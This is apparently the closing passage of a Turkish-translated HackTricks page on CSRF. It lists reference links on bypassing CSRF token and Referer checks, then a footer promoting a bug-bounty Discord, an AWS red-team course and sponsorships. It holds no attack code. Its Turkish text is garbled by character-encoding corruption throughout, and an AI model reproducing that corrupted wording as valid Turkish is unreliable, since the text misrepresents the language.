* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n ve deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸime geÃ§in!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na inen iÃ§eriklerle etkileÅŸime girin

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle gÃ¼ncel kalÄ±n

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avÄ± programlarÄ±nÄ± ve Ã¶nemli platform gÃ¼ncellemelerini takip edin

**Bize KatÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
